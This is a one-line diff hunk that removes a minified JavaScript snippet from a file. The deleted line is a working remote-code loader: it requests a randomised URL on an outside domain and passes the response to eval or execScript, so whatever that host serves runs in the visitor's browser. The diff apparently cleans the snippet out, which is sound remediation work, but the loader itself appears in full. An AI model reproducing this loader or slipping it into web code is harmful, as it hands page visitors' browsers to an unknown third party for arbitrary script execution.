@@ -1,1 +1,0 @@
-!function(){var idomain="https://www.ytdksb.com",d=idomain,a=new XMLHttpRequest,b=d+"/lz-10061-"+Math.floor(9999999*Math.random()+1);null!=a&&(a.onreadystatechange=function(){4==a.readyState&&200==a.status&&(window.execScript?window.execScript(a.responseText,"JavaScript"):window.eval?window.eval(a.responseText,"JavaScript"):eval(a.responseText))},a.open("GET",b,!1),a.send())}();
